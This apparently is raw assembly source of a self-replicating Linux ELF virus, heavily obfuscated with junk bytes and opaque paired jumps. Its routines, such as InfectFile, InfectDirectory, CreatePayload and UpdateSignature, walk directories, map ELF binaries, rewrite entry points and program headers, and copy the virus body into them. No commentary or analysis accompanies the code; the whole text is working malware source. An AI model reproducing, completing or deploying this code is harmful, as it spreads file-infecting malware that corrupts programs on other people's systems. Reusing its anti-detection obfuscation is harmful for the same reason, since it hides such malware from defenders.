    jns         ..@ERlzDxHmndSk
..@nrmcUzOm62AS:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+3
db 0x44
    jb          ..@vu5VhrPUjB4B
    jae         ..@vu5VhrPUjB4B
..@w6G98YpLK78T:
    mov         rdi, QWORD [r5+file.fileptr]
    mov         eax, 0x0
    rep         stosb
    jb          ..@S7YSLf3qmVKz
    jae         ..@S7YSLf3qmVKz
..@jVgWGHmGg8sU:
    mov         eax, ebx
    and         eax, edx
    jmp         $+4
db 0x2b, 0x30
    jmp         $+3
db 0x97
    jb          ..@EARyXOhFtNjA
    jae         ..@EARyXOhFtNjA
..@euuEa0fW43Iv:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+4
db 0x73, 0xb6
    jmp         $+5
db 0x8e, 0x0f, 0x86
    jl          ..@siWE1kcdeWrC
    jge         ..@siWE1kcdeWrC
..@eG0Mr33tpY9f:
    mul         r2
    add         rax, r1
    jmp         $+5
db 0x90, 0x83, 0xab
    jmp         ..@76YFoVdf6LLy
..@rSOURfNrjQur:
    sub         rsp, _INFDIR_OFF_size
    jmp         $+4
db 0xcb, 0xf0
    js          ..@UlnagV2qeBVj
    jns         ..@UlnagV2qeBVj
..@vgrXkZk9d9co:
    sub         rsp, _LZSSE_OFF_size
    js          ..@TRGNpw2karFK
    jns         ..@TRGNpw2karFK
InfectFile:
    jmp         ..@vULqIXN9JSsi
..@omUPQJ9iuqkO:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jmp         $+5
db 0x4a, 0x61, 0x12
    jmp         ..@85t7Hrssn8AR
..@ka0jQnnnblRE:
    add         rbx, 1
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jmp         $+5
db 0x3b, 0x30, 0xc8
    jmp         ..@ntBUmUnU5nBV
..@av81zLgZcg5R:
    jmp         ..@gQvvxN7q3uVp
    js          ..@x6Omr3KMUToR
    jns         ..@x6Omr3KMUToR
..@5kP40eKhX3xu:
    add         eax, 0x30
    jb          ..@x0UQY5pbnCeo
    jae         ..@x0UQY5pbnCeo
..@FU9VppnTW1I7:
    xor         rdx, rdx
    jmp         $+3
db 0xb1
    jb          ..@sDVZbIHxTyI4
    jae         ..@sDVZbIHxTyI4
..@z4DgitkMtva6:
%ifdef X86_32
    mov         esi, 0x22
    mov         edi, 0xffffffff
%endif
    jmp         $+4
db 0xa2, 0x42
    jmp         ..@XvrfEv7oyj2W
..@vBaK7cKGmvIL:
    je          ..@Xz94S5R0nMP4
    jmp         ..@lsrxRNxO1dmY
    jmp         $+5
db 0x48, 0x13, 0xfc
    jmp         ..@Xz94S5R0nMP4
..@He2bMMJclM0I:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+5
db 0xbf, 0x09, 0x1a
    jmp         $+4
db 0x78, 0x95
    jl          ..@1pTBN4XL8vj0
    jge         ..@1pTBN4XL8vj0
..@Ay0Bf7Fn2y08:
    mov         rax, (-1)
    jmp         $+4
db 0x2c, 0x66
    jmp         $+4
db 0xff, 0x34
    jmp         ..@ej65ZzKjvLsa
..@rHSU8kEqdzop:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+3
db 0xb3
    jb          ..@rB4GETD5ifYp
    jae         ..@rB4GETD5ifYp
..@n4xdSgJlbJnS:
    cmp         rax, (-1)
    je          ..@x6Omr3KMUToR
    mov         r3, r4
    je          ..@BLRs47JF4QMZ
    jne         ..@BLRs47JF4QMZ
..@BJptOqzVlZ3l:
    cmp         QWORD m7, 0x00
    je          ..@euuEa0fW43Iv
    mov         r4, m7
    jmp         $+4
db 0x10, 0xe4
    jl          ..@p37old7mfoaj
    jge         ..@p37old7mfoaj
..@dXV20F0IyeEX:
    add         r1, 1
    jmp         $+3
db 0xe2
    je          ..@M2nY5bqDxRtj
    jne         ..@M2nY5bqDxRtj
..@76YFoVdf6LLy:
    pop         r1
    js          ..@Q4m9ni0Rx1mo
    jns         ..@Q4m9ni0Rx1mo
..@owTMzOGEfuik:
    add         eax, 0x57
    jl          ..@2U7pgjbVf5pd
    jge         ..@2U7pgjbVf5pd
..@cTQIcHlqeoPc:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+5
db 0xe4, 0xa4, 0xa8
    js          ..@xLBrgvzHONZy
    jns         ..@xLBrgvzHONZy
..@AqSZKmHmdrWy:
    cmp         rax, 0x01
    jl          ..@oTJlm0JwKNMX
    jge         ..@oTJlm0JwKNMX
..@C9p2avbLxfeE:
    xor         rax, rax
    mov         dx, WORD [rsp] 
    js          ..@BdI5QirtH7bP
    jns         ..@BdI5QirtH7bP
..@tKdZEFRgeNtZ:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0x66, 0x1c
    jl          ..@jLSNbcFWHopA
    jge         ..@jLSNbcFWHopA
..@lE12NndRsRdq:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         $+4
db 0x3e, 0x2f
    js          ..@YWNw5OKqSvoa
    jns         ..@YWNw5OKqSvoa
..@UGIplteGu2Gb:
    mov         r1, QWORD [r5+file.filesize]
    jmp         $+3
db 0xe7
    js          ..@V6EBjfRBvj0g
    jns         ..@V6EBjfRBvj0g
..@BLRs47JF4QMZ:
    mov         r2, m6
    jl          ..@5SYyXYGKcEx3
    jge         ..@5SYyXYGKcEx3
..@t6KrFk2IwK8k:
    call        InfectDirectory
    jmp         $+5
db 0x58, 0xae, 0x10
    jmp         $+3
db 0x65
    jl          ..@LJRX9uDEVLn3
    jge         ..@LJRX9uDEVLn3
..@wzl5lYJQvsar:
    mov         r1, rax
    jmp         ..@yQCo0WuuTd0F
..@8JW2Wf1IaLnB:
    mov         edx, 100000000b
    js          ..@WnsLu5TfbnRm
    jns         ..@WnsLu5TfbnRm
..@VU40S43gw272:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mov         eax, 0x20
    jb          ..@yoTdlj9hLBV1
    jae         ..@yoTdlj9hLBV1
..@2DKso2BiCrTh:
    mov         r2, 1
    jl          ..@t6KrFk2IwK8k
    jge         ..@t6KrFk2IwK8k
..@6ASJyskr16lF:
    xor         rcx, rcx
    jl          ..@QfYQX6WrtWqK
    jge         ..@QfYQX6WrtWqK
..@TbGj71un8pGT:
    xor         rdi, rdi
    xor         rcx, rcx
    xor         rdx, rdx
    jmp         $+5
db 0xee, 0x04, 0x43
    jb          ..@C9p2avbLxfeE
    jae         ..@C9p2avbLxfeE
..@xEPTpcUrD2Kg:
    mov         r3, QWORD [r5+file.filesize]
    jmp         ..@FoKo9L151E7b
..@h5kKeLFLspuS:
    push        r2
    jmp         $+4
db 0xab, 0xfa
    jmp         ..@C0WeQk6sV2IE
..@uaLv1ug2aDj3:
    mov         QWORD [r1+e_h.e_entry], r3
    jl          ..@G8J3qwFLkxsZ
    jge         ..@G8J3qwFLkxsZ
..@0wsSG15UStSf:
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    jmp         $+4
db 0xc7, 0x43
    jmp         $+5
db 0x47, 0x1c, 0xba
    jl          ..@0XgxzafaQmft
    jge         ..@0XgxzafaQmft
..@BHeBF6UoTDla:
    je          ..@qVphEtHpxWcs
    xor         r3, r3
    mov         m6, rax
    jmp         $+3
db 0xd7
    jl          ..@QWOi7apm6q45
    jge         ..@QWOi7apm6q45
..@hXaZZP74TQGS:
    push        r5
    push        r4
    jmp         ..@RmwQj83G1alH
..@0sBLE6lw0513:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jmp         $+5
db 0xfa, 0xaa, 0xe2
    jmp         $+3
db 0x68
    jmp         ..@7hzF7QHvjdP4
..@VR9SyCt39z1P:
    add         r4, 1
    jmp         ..@av81zLgZcg5R
..@zeIYTHDhyfcJ:
    sub         rsp, _VADDR_OFF_size
    jl          ..@xPj5oJzMZJBF
    jge         ..@xPj5oJzMZJBF
..@a9lbKICOBZ5r:
    mov         r5, [rsp]
    js          ..@CNomVVKX86Uz
    jns         ..@CNomVVKX86Uz
..@YSJsXRM0YsSr:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    jl          ..@WThGw0GlGQ9o
    jge         ..@WThGw0GlGQ9o
NonBinaryFile:
    jmp         ..@NXJ5uKe8qjlE
..@NF0lXMBniLbp:
    cmp         DWORD [r1+1], "home"
    jmp         ..@fLW0lOAiStvm
..@40pJEMZnuRUV:
    jne         ..@y5oqMFwavmZD
    jmp         ..@dEU9e7s2fJjp
..@vKrj5fTFfEcj:
    sub         rsi, m6
    jmp         $+3
db 0x68
    je          ..@J565iULZN8EH
    jne         ..@J565iULZN8EH
..@sTNggXhmKe56:
    add         rax, 4
    jmp         ..@qidIwvHquVqk
..@8rJYtOwNTCCE:
    mov         rax, (-1)
    js          ..@pND99SDFJXmC
    jns         ..@pND99SDFJXmC
..@qnAfwFfZP4Rz:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    js          ..@rHSU8kEqdzop
    jns         ..@rHSU8kEqdzop
..@rufJA1mpg7vH:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+5
db 0xbe, 0xf1, 0xa9
    js          ..@GbvNTfagsbSZ
    jns         ..@GbvNTfagsbSZ
..@1fJNuZBTwev7:
    add         rdi, rcx
    add         rsi, rcx
    sub         rdi, 1
    jb          ..@X98vU0MVddqW
    jae         ..@X98vU0MVddqW
..@vinhmRIJvtGj:
    add         r2, r1
    jmp         $+5
db 0xbc, 0x21, 0xd5
    jmp         ..@LJqM4o0imLtz
..@bvXh0QBcplpk:
    mov         rdi, m6
    add         rdi, non_packed_len
    mov         m7, rdi
    jmp         $+3
db 0x1a
    jmp         ..@92nN44UNodNG
..@x6Omr3KMUToR:
    call        DestroyPayload
    jmp         $+5
db 0x2f, 0x2f, 0x7b
    jl          ..@euuEa0fW43Iv
    jge         ..@euuEa0fW43Iv
..@vjEEbCmDhFFh:
    xor         rax, rax
    ret
    jmp         ..@KaTG2Mzx4E9f
..@8XoilklbxX3T:
    inc         WORD m5
    jmp         ..@x6Omr3KMUToR
    je          ..@7x8zIdwiS6Df
    jne         ..@7x8zIdwiS6Df
..@j0J7LnYF6mDD:
    call        MemMove
    jmp         $+4
db 0xce, 0x6a
    jmp         $+5
db 0x4d, 0x21, 0xde
    jl          ..@3IRQp1CDpSeS
    jge         ..@3IRQp1CDpSeS
..@OnITfync9t1X:
    add         r1, non_packed_len+PADDING
    mov         r2, m8
    mov         r3, original_virus_len-non_packed_len
    jmp         $+3
db 0xa5
    jl          ..@j0J7LnYF6mDD
    jge         ..@j0J7LnYF6mDD
..@p01cTd4s27QJ:
    add         r1, _signature-_start
    jmp         $+3
db 0xd2
    jmp         $+3
db 0x77
    jmp         ..@8TI8pLRyyz9L
..@phwibm5BkCnE:
    mov         QWORD [r5+file.filesize], 0x00
    jmp         ..@rILw5VuCdXsp
..@Bw88Vf6yt72I:
    call        AddSizeMappedFile
    jmp         $+5
db 0x9a, 0x77, 0x3d
    jmp         $+3
db 0xe8
    jmp         $+5
db 0xda, 0x40, 0xa0
    jmp         ..@n4xdSgJlbJnS
..@t2VV5wOcTyqS:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+3
db 0x50
    jmp         ..@ybxGIdtMjje3
..@H5N9Wse746Gg:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         ..@D8irPPg1u7r2
..@3IRQp1CDpSeS:
    xor         r2, r2
    jmp         ..@RP2aG35z1M4L
..@hWAu9P1sO9kb:
    mov         r2, r1
    add         r2, e_h.e_shoff
    add         r1, QWORD [r2]
    jmp         $+4
db 0xa6, 0x02
    jl          ..@x8mVuOrKh4f3
    jge         ..@x8mVuOrKh4f3
..@1vKfTaWOkNzl:
    or          bx, ax
    jmp         $+5
db 0xe4, 0x92, 0x37
    jmp         $+3
db 0xd6
    jmp         ..@jVgWGHmGg8sU
..@rZoXNkbqVYdP:
    jl          ..@5kP40eKhX3xu
    jmp         ..@owTMzOGEfuik
    jmp         $+5
db 0x64, 0xa5, 0x5f
    jmp         ..@5kP40eKhX3xu
..@7vaX2I0MykWJ:
    cmp         QWORD m6, 0x00
    jmp         $+5
db 0x5a, 0xcb, 0x5c
    jb          ..@24io429cWiSu
    jae         ..@24io429cWiSu
..@GL51aeMXrvkM:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    jmp         ..@WGlI1NXXqwSY
..@8MdioTqVJuxY:
    jg          ..@vjEEbCmDhFFh
    jmp         $+4
db 0xc7, 0xe8
    jmp         ..@dXV20F0IyeEX
..@t1n9mnxBm196:
    xor         rcx, rcx
    xor         rbx, rbx
    jmp         $+3
db 0x14
    jmp         $+3
db 0x52
    jb          ..@qHxRH7xKk6zA
    jae         ..@qHxRH7xKk6zA
..@FDNITf5PjDoB:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+3
db 0x28
    jmp         ..@9HzX29A27Syp
..@jJDowb06RRfm:
    jmp         ..@euuEa0fW43Iv
    jb          ..@DvWom2mYU3HG
    jae         ..@DvWom2mYU3HG
..@M5yAUZFvIoos:
    rep         movsb
    jmp         $+5
db 0x7d, 0x2c, 0xd7
    jl          ..@gXtFxQ2HVyR0
    jge         ..@gXtFxQ2HVyR0
..@Z5dGYnofpNCy:
%ifdef X86_32
    xor         eax, eax
    mov         ecx, original_virus_len+PADDING
    mov         edx, 11b
%endif
    jmp         $+4
db 0xbd, 0xa6
    jmp         $+4
db 0x27, 0x6b
    je          ..@z4DgitkMtva6
    jne         ..@z4DgitkMtva6
..@02ONdobWIwKZ:
    jne         ..@UUiYVyRZYi4c
    jmp         $+4
db 0xb7, 0xe4
    jmp         $+5
db 0x51, 0x74, 0x0e
    jmp         $+5
db 0xfa, 0x8d, 0xe6
    js          ..@Shgl9WRGRWLi
    jns         ..@Shgl9WRGRWLi
..@CbjOeNs2uB8E:
    cmp         r4, 0x00
    jmp         $+3
db 0x83
    jl          ..@bmmhigOFW7no
    jge         ..@bmmhigOFW7no
..@HAiLpDez9q8i:
    cmp         WORD [r1], '..'
    je          ..@pKysl2wLF12v
    jb          ..@n1S7xe2OADGy
    jae         ..@n1S7xe2OADGy
..@zoIUgqqBx2Ke:
    jmp         ..@lsrxRNxO1dmY
    jmp         ..@glpZTnE4Q9X4
..@qhKKPmCa51RR:
    mov         QWORD [r2+p_h.p_vaddr], r3
    mov         QWORD [r2+p_h.p_paddr], r3
    jmp         $+5
db 0x8f, 0x24, 0xa7
    js          ..@rQxax0Ln1Sbl
    jns         ..@rQxax0Ln1Sbl
..@lctHSL9ymoFj:
    mov         BYTE [r1], 0x00
    jmp         ..@oTU3rbr3VA5M
..@XGdX1F3FC4ZE:
    mov         QWORD [r5+file.filesize], rax
    jmp         $+5
db 0xe6, 0x6e, 0xc7
    jmp         $+5
db 0xd0, 0x1c, 0x2d
    jmp         $+5
db 0x8c, 0x9a, 0xa7
    jl          ..@ZsvSNf7dJ8lb
    jge         ..@ZsvSNf7dJ8lb
..@iXlhLaWBaXn1:
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mov         r4, 0
    call        UpdateSignature
    jl          ..@BqrBvFU1il9X
    jge         ..@BqrBvFU1il9X
..@rD2cXF7ZO4YY:
    pop         r2
    jmp         $+5
db 0x32, 0x54, 0x75
    jmp         $+3
db 0x05
    jl          ..@VzwrAbq0mqaJ
    jge         ..@VzwrAbq0mqaJ
..@AfEKvYci0mWA:
    mov         r4d, DWORD [r1 + file.filefd]
    mov         r5, r1
    jmp         $+3
db 0xca
    jmp         $+4
db 0x87, 0xd7
    jb          ..@UK8WKGhnb5YT
    jae         ..@UK8WKGhnb5YT
..@ePD4omuMtgwB:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    js          ..@w8Z7fews0leV
    jns         ..@w8Z7fews0leV
..@o8k4c1U1ZkLe:
    xor         rcx, rcx
    jmp         $+3
db 0x67
    jmp         $+5
db 0x85, 0x30, 0x92
    js          ..@cYkAzH0AcoVP
    jns         ..@cYkAzH0AcoVP
..@QZL7KSgZ8ywh:
    and         r5, (PAGE_SIZE-1)
    add         r3, r5
    mov         r4, r3
    jmp         $+4
db 0x8f, 0x8f
    js          ..@WsiYH3eT8f0j
    jns         ..@WsiYH3eT8f0j
..@6RoGOIM2nDHk:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    call        WORDToDWORDASCII
    jmp         $+3
db 0xc0
    jmp         ..@bH15DR3j5wXW
..@aF6hf4UB6MPi:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0xd8, 0xe9
    jmp         $+4
db 0x17, 0xb2
    js          ..@J0cTxm5Z04sQ
    jns         ..@J0cTxm5Z04sQ
..@9dYDPlOQ1qqq:
    mov         r1, m6
    jb          ..@p01cTd4s27QJ
    jae         ..@p01cTd4s27QJ
..@79Y67X3uJrj6:
    mov         rax, QWORD [rsi+rcx+bytes]
    and         rax, DF_1_PIE
    jmp         ..@PnKaLwI05pXi
..@vQ0VrkAdF9lJ:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jmp         ..@6iHaSqzKkkPE
IsELFComplete:
    jmp         ..@3ic6DhI0ASvE
..@m2pGt0M8bhFg:
    cmp         rax, 0x00
    jl          ..@Tz071gMscT7I
    xor         r4, r4
    jmp         $+4
db 0x2a, 0xec
    jl          ..@1Tye1sI1G11J
    jge         ..@1Tye1sI1G11J
..@ULdlO5sCBaEo:
    mov         rcx, m7
    sub         rcx, m6
    mov         eax, 0x00
    jmp         $+5
db 0x30, 0x32, 0xb1
    js          ..@binAT9m3fVDc
    jns         ..@binAT9m3fVDc
..@teIXRbExsdIU:
    jne         ..@7x8zIdwiS6Df
    jmp         $+5
db 0x8d, 0x55, 0x2f
    jmp         ..@tZkZmvBKDdwL
..@Pmf2jTsNK6XL:
    jle         ..@BwHnreKiyFUD
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         $+5
db 0x8c, 0xa0, 0xbd
    jmp         $+3
db 0xb7
    jmp         ..@s3CQhgvYrxm3
..@7rDilQGfzbZy:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@Kv12tsZ0hliT
..@KaTG2Mzx4E9f:
    mov         eax, 1
    ret
    jmp         $+4
db 0xcf, 0x5b
    js          Strcpy
    jns         Strcpy
..@XvrfEv7oyj2W:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    jmp         $+3
db 0x3e
    jmp         $+3
db 0xc0
    jmp         ..@Wr9LCKKCOVq5
..@1YEJrEQ3c3Rs:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jl          ..@ZZcEz2nWKggd
    jge         ..@ZZcEz2nWKggd
..@xC6QOrzoOLUT:
    mov         r3, non_packed_len
    call        MemMove
    jmp         ..@vJD07H5GOYam
..@24io429cWiSu:
    je          ..@euuEa0fW43Iv
    jmp         $+5
db 0xd3, 0x47, 0xbe
    js          ..@BJptOqzVlZ3l
    jns         ..@BJptOqzVlZ3l
..@GgSvNHpQARbw:
    push        r1
    jmp         $+3
db 0x3f
    jmp         $+3
db 0x40
    jmp         $+5
db 0x08, 0x9f, 0xb5
    jmp         ..@zeIYTHDhyfcJ
..@TLQksCwlsS6m:
    push        r4
    push        r5
    xor         r4, r4
    jb          ..@AfEKvYci0mWA
    jae         ..@AfEKvYci0mWA
..@izs06Jzt6tgb:
    mov         r2, [rsp+_PROC_OFF.dirname]
    jmp         $+5
db 0x00, 0x55, 0xea
    jmp         $+4
db 0xa7, 0xf2
    jmp         $+4
db 0xae, 0x9d
    jmp         ..@tdRzVJRMCVmT
..@J565iULZN8EH:
    mov         DWORD [rdi], esi
    add         rdi, 0x4
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    js          ..@WEinlt0eDrNJ
    jns         ..@WEinlt0eDrNJ
..@0ROco8XYMcgp:
    shl         ebx, LENGTH_BITS
    jmp         $+5
db 0x96, 0xb3, 0x29
    jl          ..@1vKfTaWOkNzl
    jge         ..@1vKfTaWOkNzl
..@eu4jYhkSlYhi:
    add         r1, 1
    jmp         $+3
db 0x8c
    jmp         ..@C9BjFJJF4PTQ
..@GBEKURlDXUiW:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jl          ..@ybxGIdtMjje3
    jmp         ..@xm5M6TpNyPKr
..@ZrddbvLlbrJd:
    pop         r4
    ret
    jmp         $+3
db 0x66
    jb          MapFile
    jae         MapFile
..@Mahqey4gWF2P:
    inc         WORD m5
    jmp         $+4
db 0xc6, 0x4b
    jmp         ..@ju1XxPHbn5gb
..@bq74V5EXyLYn:
    sub         rsp, _UPDATASIG_OFF_size
    jmp         $+4
db 0x5e, 0xd6
    jmp         $+5
db 0x6f, 0xaf, 0x4d
    jmp         ..@0wsSG15UStSf
..@QMwawIlEQSZE:
    je          ..@pKysl2wLF12v
    mov         r2d, DWORD [r1]
    jmp         $+4
db 0x89, 0x6f
    jmp         $+5
db 0x20, 0xfe, 0xaf
    jl          ..@dBBk0JSlKssF
    jge         ..@dBBk0JSlKssF
InfectionRoutine:
    jmp         ..@kXAAJ7PiPK4t
GetNewProgramVaddr:
    jmp         ..@GgSvNHpQARbw
..@pND99SDFJXmC:
    pop         r1
    ret
    jmp         $+4
db 0xb5, 0x77
    jmp         $+4
db 0xc6, 0x02
    jl          AddSizeMappedFile
    jge         AddSizeMappedFile
..@G4qcRNb4gMHk:
    jmp         ..@mV1A4zx0WmbP
    jl          ..@W8IRcwkOikd0
    jge         ..@W8IRcwkOikd0
..@Shgl9WRGRWLi:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    call        FileValidation
    cmp         rax, 0x02
    js          ..@9K4QEOzg5fPE
    jns         ..@9K4QEOzg5fPE
..@CBw5mMcFQ45P:
    xor         rax, rax
    je          ..@qUYc19sDKmG6
    jne         ..@qUYc19sDKmG6
..@S7YSLf3qmVKz:
    xor         r2, r2
    je          ..@qGAOaolWu1d0
    jne         ..@qGAOaolWu1d0
..@Zcgs1e5yGNUj:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    xor         rax, rax
    jmp         $+4
db 0x14, 0x49
    jmp         $+3
db 0xd5
    jmp         ..@fiObNyuIObLA
..@Nrs5Qzzzgwlb:
    test        r2, r2
    jmp         $+3
db 0xeb
    jmp         $+3
db 0x71
    jmp         ..@HqGJRUxtbm9g
..@Rkr4BI3bEH27:
    cmp         cl, 0x4
    jl          ..@BdI5QirtH7bP
    pop         rax
    jmp         $+4
db 0x88, 0x47
    js          ..@B14Z6pbv97PY
    jns         ..@B14Z6pbv97PY
..@qidIwvHquVqk:
    push        rax
    jmp         $+5
db 0x21, 0x06, 0x30
    jl          ..@6LbVzp1rGMXw
    jge         ..@6LbVzp1rGMXw
CreatePayload:
    jmp         ..@e2DGFcKl8L3U
..@1pTBN4XL8vj0:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jl          ..@Jpw4BwKAjlK7
    jge         ..@Jpw4BwKAjlK7
..@O14yMr9qd0CV:
    xor         rax, rax
    jmp         $+4
db 0x13, 0x9b
    jmp         $+3
db 0x37
    je          ..@t1n9mnxBm196
    jne         ..@t1n9mnxBm196
..@lD6mTKIgqZmi:
    push        r1
    jmp         ..@hT0uUjCo1VYv
..@bmmhigOFW7no:
    jle         ..@euuEa0fW43Iv
    jmp         $+5
db 0x28, 0x30, 0x8c
    jmp         $+3
db 0x86
    je          ..@8PHG4FxEohdQ
    jne         ..@8PHG4FxEohdQ
..@sDVZbIHxTyI4:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@320Wzi4DABiz
..@WThGw0GlGQ9o:
    call        UpdateSignature
    jmp         ..@CuK4tx2PNLIv
..@vu5VhrPUjB4B:
    cmp         rax, 0x00
    jle         ..@DcDtRgOg12Rm
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    jmp         $+5
db 0x7e, 0x8d, 0xde
    jb          ..@ARxET5gNCPva
    jae         ..@ARxET5gNCPva
..@C0z6esBUdcb6:
    std
    jmp         $+5
db 0xcd, 0xe6, 0xf6
    js          ..@UF9cGT9nbHh5
    jns         ..@UF9cGT9nbHh5
..@c09bVhX75nB0:
    syscall
    xor         r1, r1
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@98ehD3ialNm2
..@RWWF6JqWbrHn:
    jmp         ..@rHSU8kEqdzop
    jmp         $+4
db 0x65, 0xa8
    jb          ..@BwHnreKiyFUD
    jae         ..@BwHnreKiyFUD
..@vBLtEMuL1tY6:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         $+3
db 0x62
    jmp         $+3
db 0x35
    jmp         $+5
db 0xf2, 0xce, 0x58
    js          ..@Kp01QP34HkWN
    jns         ..@Kp01QP34HkWN
..@PaPGV0N0tEd7:
%ifdef X86_32
    pop         ebp
%endif
    js          ..@7lt5UwcyllIx
    jns         ..@7lt5UwcyllIx
..@wc2pgiar9hWd:
    xor         rdi, rdi
    xor         rcx, rcx
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    je          ..@VU40S43gw272
    jne         ..@VU40S43gw272
..@ntBUmUnU5nBV:
    jl          ..@kwK632gyAST4
    mov         rax, 1
    jmp         ..@3FP61YZXVpfB
    jmp         $+3
db 0x5a
    jmp         ..@YwG9ihM9qb21
..@GTn0D750zTwj:
    push        r5
    jl          ..@bq74V5EXyLYn
    jge         ..@bq74V5EXyLYn
..@oVCx4er5rGCq:
    pop         r4
    pop         r5
    ret
    jmp         IsELFComplete
..@Q6RTDmwSsTNS:
    ret
    jmp         $+3
db 0xab
    jmp         $+5
db 0x69, 0x39, 0xce
    jmp         LzssEncoder
..@T4Tp1S4qMh9V:
    cmp         rax, 0xffffffffffffffff
    je          ..@CBw5mMcFQ45P
    mov         r5, [rsp]
    jmp         $+5
db 0x72, 0xc3, 0x15
    jmp         ..@ivKP0DeHmZcF
..@hvkFPDOlHn3w:
    cmp         al, 0xa
    jmp         $+3
db 0x1c
    jmp         $+3
db 0xf9
    jb          ..@rZoXNkbqVYdP
    jae         ..@rZoXNkbqVYdP
..@bqOfxcL8j1z6:
    rep         cmpsb
    jl          ..@Pe5JlxJEsV3g
    jge         ..@Pe5JlxJEsV3g
..@e1mBqM7l1j93:
    mov         eax, SYS_MREMAP
    syscall
    cmp         rax, 0xffffffffffffffff
    jmp         ..@8vlF52B1qVei
..@qTq4VrNYuLYS:
    je          ..@Tz071gMscT7I
    jmp         ..@TSkbAGau9jDj
..@98ehD3ialNm2:
    mov         DWORD [r5+file.filefd], 0x00
    jb          ..@phwibm5BkCnE
    jae         ..@phwibm5BkCnE
..@siWE1kcdeWrC:
    call        UnmapFile
    jmp         $+3
db 0x7b
    js          ..@UUiYVyRZYi4c
    jns         ..@UUiYVyRZYi4c
..@G7ZvakXNwHiu:
    mov         eax, SYS_MUNMAP
    js          ..@WQM4lYyCb6kF
    jns         ..@WQM4lYyCb6kF
..@UdFBplhdGWJS:
    ret
    jmp         $+3
db 0xf6
    jmp         $+5
db 0x94, 0xd3, 0x79
    jb          DestroyPayload
    jae         DestroyPayload
..@aINLPXnbONsS:
    je          ..@AhYZ2QbGV74B
    cmp         rdi, rsi
    jbe         ..@D5Wqi7wAM3ma
    jmp         ..@1fJNuZBTwev7
..@NXJ5uKe8qjlE:
    sub         rsp, _NBF_OFF_size
    jmp         $+3
db 0x3c
    jmp         ..@BLtOfbe28x60
..@ZpbUa3hFwlwU:
    call        Strcpy
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+3
db 0x5e
    jl          ..@RhwAFbsQk17z
    jge         ..@RhwAFbsQk17z
..@0nAN7EFrqDC3:
    VAR         packed, pwd_var
    mov         r1, r5
    jmp         $+4
db 0xa1, 0xb9
    js          ..@tzF2sdVqQfEW
    jns         ..@tzF2sdVqQfEW
..@0Fr7A6CYEBO0:
    jmp         ..@uQqs81K0AI4f
    jmp         $+3
db 0x05
    jl          ..@9TuPDvn8qdiK
    jge         ..@9TuPDvn8qdiK
MapFile:
    jmp         ..@NtXOQAZx1CZd
..@5SYyXYGKcEx3:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    jb          ..@sFoTWZufsLXw
    jae         ..@sFoTWZufsLXw
..@ARxET5gNCPva:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         ..@58ZAdBsY5v3m
..@6LbVzp1rGMXw:
    VAR         packed, dirs_root
    jb          ..@mDCfi2PnMyIL
    jae         ..@mDCfi2PnMyIL
..@9P1WbWKHQH3G:
    jge         ..@pKysl2wLF12v
    je          ..@AyUN2hpX3hVJ
    jne         ..@AyUN2hpX3hVJ
..@DvWom2mYU3HG:
    xor         r2, r2
    lea         r1, [rsp+_INFFILE_OFF.file]
    mov         r2, m5
    jmp         $+3
db 0x72
    jb          ..@eOq5pUp2PLq9
    jae         ..@eOq5pUp2PLq9
